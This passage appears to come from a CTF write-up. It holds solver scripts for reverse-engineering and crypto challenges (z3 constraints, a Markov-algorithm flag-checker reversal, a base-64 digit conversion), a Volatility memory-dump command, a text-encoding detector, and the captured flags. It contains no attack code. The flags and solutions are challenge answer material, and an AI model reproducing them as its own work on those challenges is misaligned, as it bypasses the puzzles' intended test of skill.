x.add((a[0+32]*12+a[1+32]*197+a[2+32]*214+a[3+32]*249+a[4+32]*215+a[5+32]*165+a[6+32]*171+a[7+32]*176+a[8+32]*79+a[9+32]*65+a[10+32]*251+a[11+32]*16+a[12+32]*142+a[13+32]*112+a[14+32]*6+a[15+32]*17)&0xff==s1[9+32])
x.add((a[0+32]*205+a[1+32]*251+a[2+32]*189+a[3+32]*70+a[4+32]*254+a[5+32]*140+a[6+32]*181+a[7+32]*213+a[8+32]*252+a[9+32]*112+a[10+32]*106+a[11+32]*243+a[12+32]*66+a[13+32]*193+a[14+32]*147+a[15+32]*180)&0xff==s1[10+32])
x.add((a[0+32]*149+a[1+32]*205+a[2+32]*80+a[3+32]*192+a[4+32]*174+a[5+32]*110+a[6+32]*160+a[7+32]*121+a[8+32]*103+a[9+32]*78+a[10+32]*174+a[11+32]*90+a[12+32]*205+a[13+32]*99+a[14+32]*2+a[15+32]*174)&0xff==s1[11+32])
x.add((a[0+32]*79+a[1+32]*144+a[2+32]*161+a[3+32]*243+a[4+32]*140+a[5+32]*55+a[6+32]*149+a[7+32]*18+a[8+32]*60+a[9+32]*201+a[10+32]*149+a[11+32]*216+a[12+32]*2+a[13+32]*226+a[14+32]*49+a[15+32]*81)&0xff==s1[12+32])
x.add((a[0+32]*114+a[1+32]*188+a[2+32]*139+a[3+32]*5+a[4+32]*60+a[5+32]*238+a[6+32]*7+a[7+32]*114+a[8+32]*202+a[9+32]*44+a[10+32]*75+a[11+32]*118+a[12+32]*130+a[13+32]*100+a[14+32]*8+a[15+32]*91)&0xff==s1[13+32])
x.add((a[0+32]*18+a[1+32]*91+a[2+32]*153+a[3+32]*190+a[4+32]*44+a[5+32]*223+a[6+32]*146+a[7+32]*193+a[8+32]*250+a[9+32]*24+a[10+32]*25+a[11+32]*51+a[12+32]*158+a[13+32]*102+a[14+32]*122+a[15+32]*164)&0xff==s1[14+32])
x.add((a[0+32]*211+a[1+32]*205+a[2+32]*34+a[3+32]*52+a[4+32]*227+a[5+32]*81+a[6+32]*76+a[7+32]*70+a[8+32]*147+a[9+32]*203+a[10+32]*66+a[11+32]*176+a[12+32]*190+a[13+32]*199+a[14+32]*34+a[15+32]*48)&0xff==s1[15+32])

x.add((a[0+48]*170+a[1+48]*237+a[2+48]*236+a[3+48]*93+a[4+48]*142+a[5+48]*135+a[6+48]*65+a[7+48]*255+a[8+48]*166+a[9+48]*166+a[10+48]*16+a[11+48]*91+a[12+48]*198+a[13+48]*1+a[14+48]*122+a[15+48]*253)&0xff==s1[0+48])
x.add((a[0+48]*61+a[1+48]*113+a[2+48]*174+a[3+48]*90+a[4+48]*79+a[5+48]*220+a[6+48]*48+a[7+48]*235+a[8+48]*141+a[9+48]*151+a[10+48]*254+a[11+48]*40+a[12+48]*64+a[13+48]*76+a[14+48]*131+a[15+48]*127)&0xff==s1[1+48])
x.add((a[0+48]*115+a[1+48]*204+a[2+48]*168+a[3+48]*225+a[4+48]*233+a[5+48]*242+a[6+48]*141+a[7+48]*102+a[8+48]*80+a[9+48]*175+a[10+48]*32+a[11+48]*117+a[12+48]*30+a[13+48]*15+a[14+48]*213+a[15+48]*91)&0xff==s1[2+48])
x.add((a[0+48]*60+a[1+48]*35+a[2+48]*61+a[3+48]*255+a[4+48]*133+a[5+48]*212+a[6+48]*75+a[7+48]*110+a[8+48]*81+a[9+48]*35+a[10+48]*159+a[11+48]*111+a[12+48]*146+a[13+48]*237+a[14+48]*215+a[15+48]*142)&0xff==s1[3+48])
x.add((a[0+48]*179+a[1+48]*68+a[2+48]*170+a[3+48]*215+a[4+48]*255+a[5+48]*48+a[6+48]*250+a[7+48]*58+a[8+48]*77+a[9+48]*39+a[10+48]*49+a[11+48]*22+a[12+48]*83+a[13+48]*93+a[14+48]*73+a[15+48]*96)&0xff==s1[4+48])
x.add((a[0+48]*130+a[1+48]*47+a[2+48]*195+a[3+48]*93+a[4+48]*192+a[5+48]*178+a[6+48]*12+a[7+48]*43+a[8+48]*151+a[9+48]*29+a[10+48]*29+a[11+48]*55+a[12+48]*86+a[13+48]*76+a[14+48]*161+a[15+48]*55)&0xff==s1[5+48])
x.add((a[0+48]*128+a[1+48]*107+a[2+48]*107+a[3+48]*112+a[4+48]*214+a[5+48]*51+a[6+48]*36+a[7+48]*132+a[8+48]*207+a[9+48]*213+a[10+48]*25+a[11+48]*166+a[12+48]*254+a[13+48]*206+a[14+48]*248+a[15+48]*98)&0xff==s1[6+48])
x.add((a[0+48]*21+a[1+48]*72+a[2+48]*129+a[3+48]*228+a[4+48]*192+a[5+48]*190+a[6+48]*109+a[7+48]*203+a[8+48]*19+a[9+48]*35+a[10+48]*56+a[11+48]*202+a[12+48]*249+a[13+48]*95+a[14+48]*176+a[15+48]*159)&0xff==s1[7+48])
x.add((a[0+48]*39+a[1+48]*66+a[2+48]*218+a[3+48]*115+a[4+48]*168+a[5+48]*25+a[6+48]*32+a[7+48]*137+a[8+48]*73+a[9+48]*185+a[10+48]*80+a[11+48]*213+a[12+48]*69+a[13+48]*68+a[14+48]*59+a[15+48]*16)&0xff==s1[8+48])
x.add((a[0+48]*12+a[1+48]*197+a[2+48]*214+a[3+48]*249+a[4+48]*215+a[5+48]*165+a[6+48]*171+a[7+48]*176+a[8+48]*79+a[9+48]*65+a[10+48]*251+a[11+48]*16+a[12+48]*142+a[13+48]*112+a[14+48]*6+a[15+48]*17)&0xff==s1[9+48])
x.add((a[0+48]*205+a[1+48]*251+a[2+48]*189+a[3+48]*70+a[4+48]*254+a[5+48]*140+a[6+48]*181+a[7+48]*213+a[8+48]*252+a[9+48]*112+a[10+48]*106+a[11+48]*243+a[12+48]*66+a[13+48]*193+a[14+48]*147+a[15+48]*180)&0xff==s1[10+48])
x.add((a[0+48]*149+a[1+48]*205+a[2+48]*80+a[3+48]*192+a[4+48]*174+a[5+48]*110+a[6+48]*160+a[7+48]*121+a[8+48]*103+a[9+48]*78+a[10+48]*174+a[11+48]*90+a[12+48]*205+a[13+48]*99+a[14+48]*2+a[15+48]*174)&0xff==s1[11+48])
x.add((a[0+48]*79+a[1+48]*144+a[2+48]*161+a[3+48]*243+a[4+48]*140+a[5+48]*55+a[6+48]*149+a[7+48]*18+a[8+48]*60+a[9+48]*201+a[10+48]*149+a[11+48]*216+a[12+48]*2+a[13+48]*226+a[14+48]*49+a[15+48]*81)&0xff==s1[12+48])
x.add((a[0+48]*114+a[1+48]*188+a[2+48]*139+a[3+48]*5+a[4+48]*60+a[5+48]*238+a[6+48]*7+a[7+48]*114+a[8+48]*202+a[9+48]*44+a[10+48]*75+a[11+48]*118+a[12+48]*130+a[13+48]*100+a[14+48]*8+a[15+48]*91)&0xff==s1[13+48])
x.add((a[0+48]*18+a[1+48]*91+a[2+48]*153+a[3+48]*190+a[4+48]*44+a[5+48]*223+a[6+48]*146+a[7+48]*193+a[8+48]*250+a[9+48]*24+a[10+48]*25+a[11+48]*51+a[12+48]*158+a[13+48]*102+a[14+48]*122+a[15+48]*164)&0xff==s1[14+48])
x.add((a[0+48]*211+a[1+48]*205+a[2+48]*34+a[3+48]*52+a[4+48]*227+a[5+48]*81+a[6+48]*76+a[7+48]*70+a[8+48]*147+a[9+48]*203+a[10+48]*66+a[11+48]*176+a[12+48]*190+a[13+48]*199+a[14+48]*34+a[15+48]*48)&0xff==s1[15+48])

if x.check()==z3.sat:
    print("success")
    m=x.model()
    for i in a:
        if m[i] is not None:
                print(chr(m[i].as_long()),end='')
    print("")
else:
    print("failed") 
#ictf{S_d1dnt_5t4nd_f0r_5t4ck_b3c4u53_h3r3_I_us3d_4_L1nk3d_qu3u3}
```



```
def vokram(text, program,f):
    while True:
        for pat, repl, stop in program:
            if pat in text:
                text = text.replace(pat, repl, 1)
                f.write(text+' n')
                if stop:
                    return text
                break
        else:
            return text

# def vokram_re(text,program):
#     while True:
#         for pat, repl, stop in program:
#             if repl in text and repl != '':
#                 text = text.replace(repl, pat, 1)
#                 if stop:
#                     return text
#                 break
#         else:
#             return text
        
def parse(source):
    program = []
    for line in source.strip().splitlines():
        pat, repl = line.split(":", 1)
        stop = False
        if len(repl) > 0 and repl[0] == ":":
            repl = repl[1:]
            stop = True
        if ":" in repl:
            raise ValueError("invalid rule: %r" % line)
        program.append((pat, repl, stop))
    return program

source_file = "check_flag.vokram"
input_str = "♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂{♂i♂c♂t♂f♂}"
with open(source_file,'r',encoding='utf-8') as f:
    program = parse(f.read())
with open('test3.txt','w+',encoding='utf-8') as f:
    #vokram(input_str, program,f)
    print('')

output_str =program[3441][0]
# program=program[::-1]
# print(vokram_re(output_str, program))
import sys
sys.setrecursionlimit(3000)

s1=''
def retback(text,program,f):
    global output_str
    global s1
    for pat, repl, stop in program:
        if text in repl:
            if pat!='':
                s1=pat+'🍍🥽'+s1[1:]
                f.write(str((pat, repl, stop))+'n')
                text=pat
                retback(text,program,f)
                return s1
            else:
                return s1
with open('test1.txt','w+',encoding='utf-8') as f:
    retback('📑🍍🥽',program,f)
    f.write('nnn '+s1+' n')
    
s2='📑🔼🦥🔼🦥🥽🦥🔼🦥🔼🔼🔼🦥🔼🦥🥽🥽🔼🔼🥽🥽🔼🦥🦥🥽🔼🔼🥽🥽🦥🦥🦥🦥🦥🦥🔼🥽🥽🔼🔼🥽🔼🔼🔼🦥🦥🔼🔼🥽🦥🔼🦥🔼🔼🔼🔼🦥🔼🔼🦥🥽🦥🦥🔼🔼🥽🦥🦥🦥🔼🦥🥽🦥🔼🦥🥽🥽🥽🔼🥽🥽🥽🥽🦥🔼🥽🥽🔼🦥🔼🔼🔼🔼🔼🥽🥽🔼🥽🦥🦥🦥🦥🥽🦥🔼🦥🔼🦥🔼🥽🦥🔼🥽🦥🔼🥽🥽🔼🦥🥽🥽🥽🦥🔼🥽🦥🔼🦥🦥🔼🥽🔼🦥🥽🔼🦥🥽🔼🦥🔼🦥🦥🔼🦥🔼🦥🔼🔼🥽🔼🔼🥽🦥🦥🔼🔼🦥🦥🥽🦥🔼🦥🦥🥽🔼🥽🦥🦥🔼🦥🦥🥽🦥🥽🔼🥽🥽🥽🔼🥽🦥🔼🔼🔼🔼🔼🔼🥽🥽🥽🔼🦥🥽🦥🥽🦥🦥🥽🥽🔼🥽🥽🦥🥽🔼🥽🦥🔼🔼🔼🔼🔼🦥🥽🔼🥽🦥🦥🥽🔼🦥🥽🥽🥽🔼🔼'
#print(len(s2)//5)

count=0
i=0
for index,(pat, repl, stop) in enumerate(program):
    if len(pat)==3:
        if i == 0:
            i=index
        count+=1

# program[i:i+count]=program[i:i+count][::-1]

# with open("text4.txt",'w+',encoding='utf-8') as f:
#     while s2[0] != '🏓':
#         tmp = s2[-1:]
#         tmp = '🍷'+tmp
#         s2 = s2[:-1]+tmp
#         head=s2[0]
#         while s2[0] == head:
#             for pat, repl, stop in program:
#                 if repl in s2 and repl != '':
#                     s2 = s2.replace(repl, pat, 1)
#                     f.write(s2+' n')
#                     break;
#                 if 'け🔼' in s2:
#                     s2=s2.replace('け🔼','🍍🥽🔼')
#                 elif 'け🥽' in s2:
#                     s2=s2.replace('け🥽','🍍🥽🥽')
#                 elif 'け🦥' in s2:
#                     s2=s2.replace('け🦥','🍍🥽🦥')

#     s2=s2[1:]
#     f.write(s2+' n')
#     for i in range(45):
#         for pat, repl, stop in program:
#             if repl[:5] in s2:
#                 s2=s2.replace(repl,pat,1)
#                 break
    
#     f.write(s2+' n')
    
s3='🔼🥽🦥🦥🥽🔼🥽🦥🥽🥽🔼🔼🥽🦥🦥🔼🥽🦥🔼🥽🔼🔼🔼🦥🥽🔼🔼🥽🥽🥽🔼🥽🦥🔼🥽🔼🔼🥽🦥🔼🔼🔼🥽🦥🥽🔼🥽🔼🔼🦥🥽🔼🦥🦥🔼🔼🔼🥽🥽🦥🔼🥽🦥🥽🔼🔼🥽🔼🔼🦥🔼🔼🥽🥽🔼🥽🔼🦥🦥🔼🔼🔼🥽🦥🥽🔼🥽🦥🦥🦥🥽🔼🦥🔼🥽🔼🔼🔼🥽🔼🔼🥽🔼🔼🦥🔼🥽🔼🦥🔼🔼🔼🥽🥽🥽🔼🥽🦥🔼🔼🥽🔼🦥🔼🥽🔼🔼🥽🦥🥽🥽🔼🦥🔼🔼🥽🦥🥽🥽🔼🔼🥽🦥🔼🦥🔼🔼🥽🥽🔼🔼🥽🔼🔼🦥🔼🔼🥽🥽🔼🔼🥽🔼🦥🔼🔼🔼🥽🔼🥽🥽🔼🦥🥽🔼🔼🔼🥽🦥🔼🔼🔼🥽🥽🦥🔼🔼🔼🥽🥽🔼🥽🦥🦥🦥🔼🥽🦥🥽🦥🥽🔼🦥🥽🔼🔼🔼🥽🔼🥽🔼🔼🥽🦥🥽🔼🥽🦥🔼🔼🔼🔼🔼🦥🦥'

s4=''
with open('test5.txt','w+',encoding='utf-8') as f:
    for i in range(45):
        text=s3[i*5:i*5+5]
        for pat, repl, stop in program:
            if len(repl)>5 and repl[:5] == text:
                s4+=pat
                break
    f.write(s4+' n')
    
for i in range(0,len(s4),2):
    print(s4[i+1],end='')
print('')
#ictf{lfsr_4nd_m4rk0v_alg0r17hm_mao.snuke.org}
```



```
from Crypto.Util.number import *
secret_key = [10, 52, 23, 14, 52, 16, 3, 14, 37, 37, 3, 25, 50, 32, 19, 14, 48, 32, 35, 13, 54, 12, 35, 12, 31, 29, 7, 29, 38, 61, 37, 27, 47, 5, 51, 28, 50, 13, 35, 29, 46, 1, 51, 24, 31, 21, 54, 28, 52, 8, 54, 30, 38, 17, 55, 24, 41, 1]
q = 64
k=0
a=1
for i in range(len(secret_key)):
   k+=q**i*secret_key[i]
print(long_to_bytes(k))
#ictf{b4se_c0nv3rs1on_ftw_236680982d9e8449}
```



```
vol.py -f "C:UsersPC-07Desktopdump.vmem" -o . windows.dumpfiles --virtaddr 0xc60c81c70ce0
```



```
# Common BOM headers
bom_map = {
    b'xEFxBBxBF': 'UTF-8 with BOM',
    b'xFExFF': 'UTF-16 Big Endian (BE)',
    b'xFFxFE': 'UTF-16 Little Endian (LE)',
    b'x00x00xFExFF': 'UTF-32 Big Endian (BE)',
    b'xFFxFEx00x00': 'UTF-32 Little Endian (LE)'
}

# Read the first few bytes of the file to detect the BOM header
def detect_bom(file_path):
    with open(file_path, 'rb') as file:
        raw = file.read(4)  # Read the first 4 bytes, as the longest BOM is 4 bytes
    for bom, encoding in bom_map.items():
        if raw.startswith(bom):
            return bom, encoding
    return None, None

# File path
file_path = 'encoded_string.txt'

# Detect BOM
bom, encoding = detect_bom(file_path)
if bom:
    print(f'Detected BOM: {bom}, Encoding format: {encoding}')
else:
    print('No BOM header detected or BOM header not in the known list')

# Read file content
def read_file_with_bom(file_path, bom_length):
    with open(file_path, 'rb') as file:
        file.seek(bom_length)  # Skip the BOM header
        content = file.read()  # Read file content
    return content

# Remove BOM header and read file content
if bom:
    bom_length = len(bom)
    file_content = read_file_with_bom(file_path, bom_length)
else:
    with open(file_path, 'rb') as file:
        file_content = file.read()

# Try different decoding methods
encodings_to_try = ['utf-8', 'utf-16-be', 'utf-16-le', 'utf-32-be', 'utf-32-le']

for encoding in encodings_to_try:
    try:
        decoded_content = file_content.decode(encoding)
        print(f'Decoding result using encoding {encoding}:n{decoded_content}')
    except Exception as e:
        print(f'Decoding failed using encoding {encoding}: {e}')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1721718138.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/8-1721718139.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/8-1721718139.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1721718140.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1721718141.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1721718143.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1721718144.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1721718145.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/3-1721718147.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/9-1721718149.png)